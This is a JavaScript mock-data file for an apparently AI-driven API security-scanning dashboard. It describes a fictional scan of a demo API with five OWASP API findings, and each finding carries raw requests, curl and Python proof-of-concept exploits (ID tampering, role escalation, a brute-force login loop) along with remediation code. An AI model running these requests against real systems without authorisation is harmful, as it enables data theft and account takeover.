// Shared mock data used across all dashboard pages
export const MOCK_USER = { name: 'Arjun Mehra', email: 'arjun@ronin.local' }

export const MOCK_SCAN = {
  id: 'SCAN-20260924-0001',
  target: 'https://api.vulnerable.local',
  name: 'Vulnerable Demo API',
  phase: 'Exploitation',
  phaseIndex: 2,     // 0 recon, 1 orchestrator, 2 exploit, 3 validate
  progress: 68,
  endpointsTested: 26,
  endpointsTotal: 38,
  startedMinsAgo: 14,
  currentActivity: 'Testing BOLA / parameter tampering',
  currentEndpoint: 'GET /api/v1/profile',
  status: 'running',  // running | paused | completed | failed | aborted
}

export const MOCK_AGENTS = [
  {
    id: 'orchestrator',
    name: 'Orchestrator',
    role: 'Workflow coordinator',
    status: 'completed',  // active | completed | waiting | error
    task: 'Dispatching exploit tasks',
    elapsed: '14m 03s',
    metrics: { speed: '38 tok/s', provider: 'Qwen 3.8 27B' },
  },
  {
    id: 'recon',
    name: 'Recon',
    role: 'Attack surface discovery',
    status: 'completed',
    task: 'Discovered 38 endpoints',
    elapsed: '4m 22s',
    metrics: { speed: '45 tok/s', provider: 'OpenAPI Parser' },
  },
  {
    id: 'exploit',
    name: 'Exploit',
    role: 'Vulnerability testing',
    status: 'active',
    task: 'BOLA on /api/v1/users/{id}',
    elapsed: '9m 41s',
    metrics: { speed: '42 tok/s', provider: 'Qwen 3.8 27B (Cloud)' },
  },
  {
    id: 'validate',
    name: 'Validate',
    role: 'PoC sandbox execution',
    status: 'waiting',
    task: 'Awaiting exploit results',
    elapsed: '—',
    metrics: { speed: '—', provider: 'Docker 24.x' },
  },
]

export const MOCK_FINDINGS = [
  {
    id: 'F-001',
    severity: 'critical',
    title: 'Broken Object Level Authorization (BOLA)',
    owasp: 'API1:2023',
    endpoint: '/api/v1/users/{id}',
    method: 'GET',
    cvss: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
    cvssMetrics: {
      av: 'Network',
      ac: 'Low',
      pr: 'Low (Authenticated)',
      ui: 'None Required',
      scope: 'Unchanged',
      c: 'High (PII Exposure)',
      i: 'High (Account Takeover)',
      a: 'None',
    },
    status: 'verified',
    scanId: 'SCAN-20260924-0001',
    discoveredAt: '2026-09-24 00:02',
    description: 'Authenticated users can access any user object by manipulating the {id} parameter without object-level ownership checks.',
    narrative: 'During dynamic reconnaissance, the Exploit Agent established a baseline session as User ID 1. When querying /api/v1/users/2 using User 1\'s Bearer token, the server failed to verify tenant boundaries and returned User 2\'s profile including sensitive PII and private API tokens with an HTTP 200 OK.',
    rawRequest: `GET /api/v1/users/2 HTTP/1.1
Host: api.vulnerable.local
User-Agent: Ronin-Security-Scanner/1.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json`,
    rawResponse: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 184
X-Powered-By: Express

{
  "id": 2,
  "name": "Sarah Connor",
  "email": "sarah.connor@cyberdyne.corp",
  "role": "admin",
  "billing_id": "cust_9920148",
  "api_key": "sec_live_948fba812301"
}`,
    poc: `curl -X GET "https://api.vulnerable.local/api/v1/users/2" \\
  -H "Authorization: Bearer <victim_token>"`,
    pythonPoc: `import requests

url = "https://api.vulnerable.local/api/v1/users/2"
headers = {
    "Authorization": "Bearer <low_privilege_token>",
    "Accept": "application/json"
}
response = requests.get(url, headers=headers)
print("Status Code:", response.status_code)
print("Leaked Profile:", response.json())`,
    remediation: 'Enforce object-level authorization checks server-side on every request. Validate that the requesting user identifier extracted from the validated JWT matches the queried resource owner or holds administrative privileges.',
    remediationCode: `// Middleware / Controller patch:
const verifyUserOwnership = async (req, res, next) => {
  const requestedUserId = req.params.id;
  const sessionUserId = req.user.id;
  
  if (sessionUserId !== requestedUserId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden: You do not own this resource' });
  }
  next();
};`,
  },
  {
    id: 'F-002',
    severity: 'high',
    title: 'Broken Authentication — Expired Token Acceptance',
    owasp: 'API2:2023',
    endpoint: '/api/auth/verify',
    method: 'POST',
    cvss: 8.6,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    cvssMetrics: {
      av: 'Network',
      ac: 'Low',
      pr: 'None',
      ui: 'None Required',
      scope: 'Unchanged',
      c: 'High',
      i: 'High',
      a: 'None',
    },
    status: 'verified',
    scanId: 'SCAN-20260924-0001',
    discoveredAt: '2026-09-24 00:05',
    description: 'Token verification endpoint accepts expired and revoked JWTs without checking the exp claim.',
    narrative: 'The backend verification endpoint decodes JWT payload claims but omits validation of the exp timestamp claim, permitting indefinitely replayed expired sessions.',
    rawRequest: `POST /api/auth/verify HTTP/1.1
Host: api.vulnerable.local
Content-Type: application/json

{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9..."}`,
    rawResponse: `HTTP/1.1 200 OK
Content-Type: application/json

{"valid": true, "user": {"id": 4, "role": "admin"}}`,
    poc: `curl -X POST "https://api.vulnerable.local/api/auth/verify" \\
  -H "Content-Type: application/json" \\
  -d '{"token":"<expired_jwt>"}'`,
    pythonPoc: `import requests

url = "https://api.vulnerable.local/api/auth/verify"
payload = {"token": "<expired_jwt_string>"}
res = requests.post(url, json=payload)
assert res.status_code == 200 and res.json().get("valid") is True`,
    remediation: 'Verify standard claims (exp, nbf, iat) using standard JWT verification libraries with clock tolerance configured.',
    remediationCode: `jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  ignoreExpiration: false
});`,
  },
  {
    id: 'F-003',
    severity: 'high',
    title: 'Mass Assignment — Privilege Escalation via PUT',
    owasp: 'API6:2023',
    endpoint: '/api/v1/profile',
    method: 'PUT',
    cvss: 7.5,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N',
    cvssMetrics: {
      av: 'Network',
      ac: 'Low',
      pr: 'Low',
      ui: 'None Required',
      scope: 'Unchanged',
      c: 'None',
      i: 'High (Privilege Escalation)',
      a: 'None',
    },
    status: 'verified',
    scanId: 'SCAN-20260924-0001',
    discoveredAt: '2026-09-24 00:09',
    description: 'Profile update endpoint binds all request body fields directly to user model, allowing role escalation.',
    narrative: 'When submitting a user profile update, the API passes req.body directly to the ORM update query without an allowlist. Injecting "role": "admin" succeeded in elevating permissions.',
    rawRequest: `PUT /api/v1/profile HTTP/1.1
Host: api.vulnerable.local
Authorization: Bearer <low_priv_token>
Content-Type: application/json

{"name": "Attacker", "role": "admin", "is_superadmin": true}`,
    rawResponse: `HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "user": {"name": "Attacker", "role": "admin", "is_superadmin": true}}`,
    poc: `curl -X PUT "https://api.vulnerable.local/api/v1/profile" \\
  -H "Authorization: Bearer <token>" \\
  -d '{"name":"attacker","role":"admin"}'`,
    pythonPoc: `import requests

res = requests.put(
    "https://api.vulnerable.local/api/v1/profile",
    headers={"Authorization": "Bearer <token>"},
    json={"role": "admin"}
)
print("Updated Profile:", res.json())`,
    remediation: 'Use an explicit Data Transfer Object (DTO) or field allowlist to restrict modifiable properties.',
    remediationCode: `// Pick strictly permitted fields:
const { name, bio, avatarUrl } = req.body;
await User.findByIdAndUpdate(req.user.id, { name, bio, avatarUrl });`,
  },
  {
    id: 'F-004',
    severity: 'medium',
    title: 'Excessive Data Exposure in Order Summaries',
    owasp: 'API3:2023',
    endpoint: '/api/v1/orders',
    method: 'GET',
    cvss: 5.3,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N',
    cvssMetrics: {
      av: 'Network',
      ac: 'Low',
      pr: 'Low',
      ui: 'None',
      scope: 'Unchanged',
      c: 'Low',
      i: 'None',
      a: 'None',
    },
    status: 'verified',
    scanId: 'SCAN-20260924-0001',
    discoveredAt: '2026-09-24 00:11',
    description: 'Order list response includes internal payment processor tokens and full card BINs not required by client.',
    narrative: 'The order listing endpoint serializes the full internal order document, exposing Stripe customer tokens and gateway metadata.',
    rawRequest: `GET /api/v1/orders HTTP/1.1
Host: api.vulnerable.local
Authorization: Bearer <token>`,
    rawResponse: `HTTP/1.1 200 OK
Content-Type: application/json

[{"order_id": "ORD-1", "total": 49.99, "stripe_token": "tok_12345", "card_bin": "411111"}]`,
    poc: `curl "https://api.vulnerable.local/api/v1/orders" \\
  -H "Authorization: Bearer <token>"`,
    pythonPoc: `import requests

res = requests.get("https://api.vulnerable.local/api/v1/orders", headers={"Authorization": "Bearer <token>"})
print(res.json())`,
    remediation: 'Filter response fields server-side with serializers or projection schemas.',
    remediationCode: `const orders = await Order.find({ userId: req.user.id })
  .select('orderId total status createdAt items');`,
  },
  {
    id: 'F-005',
    severity: 'low',
    title: 'Missing Rate Limiting on Authentication Endpoint',
    owasp: 'API4:2023',
    endpoint: '/api/auth/login',
    method: 'POST',
    cvss: 3.7,
    cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
    cvssMetrics: {
      av: 'Network',
      ac: 'High',
      pr: 'None',
      ui: 'None',
      scope: 'Unchanged',
      c: 'Low',
      i: 'None',
      a: 'None',
    },
    status: 'verified',
    scanId: 'SCAN-20260924-0001',
    discoveredAt: '2026-09-24 00:13',
    description: 'Login endpoint accepts unlimited authentication attempts with no throttling or lockout.',
    narrative: 'Over 500 consecutive authentication attempts were completed in under 5 seconds with 0 HTTP 429 Too Many Requests responses.',
    rawRequest: `POST /api/auth/login HTTP/1.1
Host: api.vulnerable.local
Content-Type: application/json

{"email": "admin@ronin.local", "password": "password123"}`,
    rawResponse: `HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error": "Invalid credentials"}`,
    poc: `for i in $(seq 1 100); do
  curl -X POST "https://api.vulnerable.local/api/auth/login" -d '{"email":"a@b.com","password":"test"}'
done`,
    pythonPoc: `import requests

for i in range(50):
    r = requests.post("https://api.vulnerable.local/api/auth/login", json={"email": "test@test.com", "password": f"p{i}"})
    print(i, r.status_code)`,
    remediation: 'Implement per-IP and per-account rate limiting with exponential backoff.',
    remediationCode: `const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
app.use('/api/auth/login', loginLimiter);`,
  },
]

export const MOCK_ENDPOINTS = [
  {
    id: 'E-001', method: 'GET', path: '/api/v1/users', auth: 'Bearer', tested: true, findings: 1, params: 2,
    group: '/api/v1/users',
    parameters: [
      { name: 'limit', in: 'query', type: 'integer', required: false, desc: 'Pagination limit' },
      { name: 'offset', in: 'query', type: 'integer', required: false, desc: 'Pagination offset' },
    ]
  },
  {
    id: 'E-002', method: 'GET', path: '/api/v1/users/{id}', auth: 'Bearer', tested: true, findings: 1, params: 1,
    group: '/api/v1/users',
    parameters: [
      { name: 'id', in: 'path', type: 'string', required: true, desc: 'Target user ID identifier' }
    ]
  },
  {
    id: 'E-003', method: 'POST', path: '/api/v1/users', auth: 'Bearer', tested: true, findings: 0, params: 0,
    group: '/api/v1/users',
    parameters: [
      { name: 'email', in: 'body', type: 'string', required: true, desc: 'User email address' },
      { name: 'name', in: 'body', type: 'string', required: true, desc: 'User display name' },
      { name: 'role', in: 'body', type: 'string', required: false, desc: 'Assigned system role' },
    ]
  },
  {
    id: 'E-004', method: 'PUT', path: '/api/v1/profile', auth: 'Bearer', tested: true, findings: 1, params: 4,
    group: '/api/v1/profile',
    parameters: [
      { name: 'name', in: 'body', type: 'string', required: false, desc: 'Display name' },
      { name: 'bio', in: 'body', type: 'string', required: false, desc: 'Account bio' },
      { name: 'avatar', in: 'body', type: 'string', required: false, desc: 'Avatar URL' },
      { name: 'role', in: 'body', type: 'string', required: false, desc: 'Elevated role parameter (mass assignable)' },
    ]
  },
  {
    id: 'E-005', method: 'DELETE', path: '/api/v1/users/{id}', auth: 'Bearer', tested: true, findings: 0, params: 1,
    group: '/api/v1/users',
    parameters: [
      { name: 'id', in: 'path', type: 'string', required: true, desc: 'User identifier to delete' }
    ]
  },
  {
    id: 'E-006', method: 'GET', path: '/api/v1/orders', auth: 'Bearer', tested: true, findings: 1, params: 3,
    group: '/api/v1/orders',
    parameters: [
      { name: 'status', in: 'query', type: 'string', required: false, desc: 'Order status filter' },
      { name: 'from', in: 'query', type: 'string', required: false, desc: 'Start date ISO string' },
      { name: 'limit', in: 'query', type: 'integer', required: false, desc: 'Record count' },
    ]
  },
  {
    id: 'E-007', method: 'POST', path: '/api/auth/login', auth: 'None', tested: true, findings: 1, params: 2,
    group: '/api/auth',
    parameters: [
      { name: 'email', in: 'body', type: 'string', required: true, desc: 'Account email' },
      { name: 'password', in: 'body', type: 'string', required: true, desc: 'Account plaintext password' },
    ]
  },
  {
    id: 'E-008', method: 'POST', path: '/api/auth/verify', auth: 'Bearer', tested: true, findings: 1, params: 1,
    group: '/api/auth',
    parameters: [
      { name: 'token', in: 'body', type: 'string', required: true, desc: 'JWT string to validate' }
    ]
  },
  {
    id: 'E-009', method: 'POST', path: '/api/auth/refresh', auth: 'Bearer', tested: true, findings: 0, params: 1,
    group: '/api/auth',
    parameters: [
      { name: 'refreshToken', in: 'body', type: 'string', required: true, desc: 'Cryptographic refresh token' }
    ]
  },
  {
    id: 'E-010', method: 'GET', path: '/api/v1/products', auth: 'None', tested: true, findings: 0, params: 5,
    group: '/api/v1/products',
    parameters: [
      { name: 'category', in: 'query', type: 'string', required: false, desc: 'Product category' },
      { name: 'sort', in: 'query', type: 'string', required: false, desc: 'Sort column name' },
      { name: 'order', in: 'query', type: 'string', required: false, desc: 'asc or desc' },
    ]
  },
  {
    id: 'E-011', method: 'GET', path: '/api/v1/products/{id}', auth: 'None', tested: false, findings: 0, params: 1,
    group: '/api/v1/products',
    parameters: [
      { name: 'id', in: 'path', type: 'string', required: true, desc: 'Product identifier' }
    ]
  },
  {
    id: 'E-012', method: 'POST', path: '/api/v1/reviews', auth: 'Bearer', tested: false, findings: 0, params: 3,
    group: '/api/v1/products',
    parameters: [
      { name: 'productId', in: 'body', type: 'string', required: true, desc: 'Product identifier' },
      { name: 'rating', in: 'body', type: 'integer', required: true, desc: 'Star rating 1-5' },
      { name: 'comment', in: 'body', type: 'string', required: false, desc: 'Review comment string' },
    ]
  },
]

export const MOCK_ACTIVITY = [
  {
    id: 'ACT-007',
    time: '00:14',
    agent: 'Exploit',
    event: 'Testing BOLA parameter tampering',
    endpoint: 'GET /api/v1/profile',
    sev: null,
    payload: {
      method: 'GET',
      path: '/api/v1/profile?tenant_id=2',
      headers: { 'Authorization': 'Bearer eyJhbGciOi...', 'Content-Type': 'application/json' },
      body: null,
      responseStatus: 200,
      responseSnippet: '{"id":2,"email":"target@tenant.corp","role":"admin"}',
    }
  },
  {
    id: 'ACT-006',
    time: '00:12',
    agent: 'Exploit',
    event: 'Confirmed mass assignment PoC',
    endpoint: 'PUT /api/v1/profile',
    sev: 'high',
    payload: {
      method: 'PUT',
      path: '/api/v1/profile',
      headers: { 'Authorization': 'Bearer eyJhbGciOi...', 'Content-Type': 'application/json' },
      body: '{"role":"admin","is_superadmin":true}',
      responseStatus: 200,
      responseSnippet: '{"success":true,"role":"admin"}',
    }
  },
  {
    id: 'ACT-005',
    time: '00:09',
    agent: 'Validate',
    event: 'Sandbox execution — Verified',
    endpoint: 'PUT /api/v1/profile',
    sev: 'high',
    payload: {
      method: 'DOCKER_EXEC',
      path: 'python -m ronin.sandbox.exec_poc F-003',
      headers: { 'Container-ID': 'alp_sand_8820', 'Isolation': 'chroot+cgroups' },
      body: 'curl -X PUT https://api.vulnerable.local/api/v1/profile -d \'{"role":"admin"}\'',
      responseStatus: 0,
      responseSnippet: '[SANDBOX SUCCESS] Finding F-003 verified reproducible (exit 0, latency 290ms)',
    }
  },
  {
    id: 'ACT-004',
    time: '00:07',
    agent: 'Exploit',
    event: 'Flagged broken auth anomaly',
    endpoint: 'POST /api/auth/verify',
    sev: 'high',
    payload: {
      method: 'POST',
      path: '/api/auth/verify',
      headers: { 'Content-Type': 'application/json' },
      body: '{"token":"<expired_jwt_payload>"}',
      responseStatus: 200,
      responseSnippet: '{"valid":true,"user":{"id":4}}',
    }
  },
  {
    id: 'ACT-003',
    time: '00:05',
    agent: 'Orchestrator',
    event: 'Dispatched exploit batch #3',
    endpoint: null,
    sev: null,
    payload: {
      method: 'ROUTER_DISPATCH',
      path: 'exploit_node',
      headers: { 'Priority': 'HIGH_RISK_FIRST' },
      body: '{"queued_endpoints":["E-001","E-002","E-004"]}',
      responseStatus: 200,
      responseSnippet: 'Dispatched 3 high-risk endpoints to Exploit Agent',
    }
  },
  {
    id: 'ACT-002',
    time: '00:02',
    agent: 'Validate',
    event: 'BOLA PoC — Verified critical',
    endpoint: 'GET /api/v1/users/{id}',
    sev: 'critical',
    payload: {
      method: 'DOCKER_EXEC',
      path: 'python -m ronin.sandbox.exec_poc F-001',
      headers: { 'Container-ID': 'alp_sand_8820' },
      body: 'curl -X GET https://api.vulnerable.local/api/v1/users/2 -H "Authorization: Bearer <token>"',
      responseStatus: 0,
      responseSnippet: '[SANDBOX VERIFIED] Output matched unauthorized object access (exit 0)',
    }
  },
  {
    id: 'ACT-001',
    time: '00:00',
    agent: 'Recon',
    event: 'Discovery complete — 38 endpoints found',
    endpoint: null,
    sev: null,
    payload: {
      method: 'OPENAPI_SPEC_PARSE',
      path: 'https://api.vulnerable.local/openapi.json',
      headers: { 'Accept': 'application/json' },
      body: null,
      responseStatus: 200,
      responseSnippet: 'Discovered 38 REST paths, parsed 84 parameters, scored 5 endpoints high risk',
    }
  },
]

export const MOCK_SCANS = [
  {
    id: 'SCAN-20260924-0001',
    target: 'https://api.vulnerable.local',
    name: 'Vulnerable Demo API',
    startedAt: '2026-09-24 00:00',
    duration: '14m (running)',
    endpoints: 38,
    findings: 5,
    critical: 1,
    high: 2,
    medium: 1,
    low: 1,
    validationRate: '100%',
    status: 'running',
    diff: {
      newFindings: 3,
      resolvedFindings: 1,
      unchangedFindings: 2,
    }
  },
  {
    id: 'SCAN-20260913-0001',
    target: 'https://api.example.com',
    name: 'Example API',
    startedAt: '2026-09-13 09:16',
    duration: '22m 14s',
    endpoints: 24,
    findings: 2,
    critical: 0,
    high: 1,
    medium: 1,
    low: 0,
    validationRate: '100%',
    status: 'completed',
    diff: {
      newFindings: 0,
      resolvedFindings: 4,
      unchangedFindings: 2,
    }
  },
]

export const MOCK_SANDBOX = [
  {
    id: 'POC-0003',
    finding: 'BOLA /users/{id}',
    result: 'verified',
    duration: '320ms',
    stdout: `[INFO] Initializing Alpine 3.18 container sandbox id=alp_99182
[INFO] Network egress constrained strictly to 127.0.0.1:5000 (target host)
[EXEC] Running PoC vector for F-001 (BOLA)...
curl -s -X GET "https://api.vulnerable.local/api/v1/users/2" -H "Authorization: Bearer <token>"
[RECV] Status 200 OK | Body: {"id": 2, "name": "Bob Vance", "role": "admin"}
[CHECK] Expected 403 Forbidden, received 200 with unauthorized user data.
[RESULT] VULNERABILITY CONFIRMED REPRODUCIBLE (Exit 0)`,
    stderr: '',
  },
  {
    id: 'POC-0002',
    finding: 'Broken Auth /auth/verify',
    result: 'verified',
    duration: '418ms',
    stdout: `[INFO] Initializing Alpine 3.18 container sandbox id=alp_99183
[INFO] Network egress constrained strictly to 127.0.0.1:5000 (target host)
[EXEC] Running PoC vector for F-002 (Expired Token Verification)...
curl -s -X POST "https://api.vulnerable.local/api/auth/verify" -d '{"token":"<expired_jwt>"}'
[RECV] Status 200 OK | Body: {"valid": true, "user": {"id": 4}}
[RESULT] EXPIRED TOKEN VALIDATION BYPASS VERIFIED (Exit 0)`,
    stderr: '',
  },
  {
    id: 'POC-0001',
    finding: 'Mass Assignment /profile',
    result: 'verified',
    duration: '290ms',
    stdout: `[INFO] Initializing Alpine 3.18 container sandbox id=alp_99184
[INFO] Network egress constrained strictly to 127.0.0.1:5000 (target host)
[EXEC] Running PoC vector for F-003 (Mass Assignment)...
curl -s -X PUT "https://api.vulnerable.local/api/v1/profile" -d '{"role":"admin"}'
[RECV] Status 200 OK | Body: {"success": true, "user": {"role": "admin"}}
[RESULT] PRIVILEGE ESCALATION REPRODUCIBLE (Exit 0)`,
    stderr: '',
  },
]
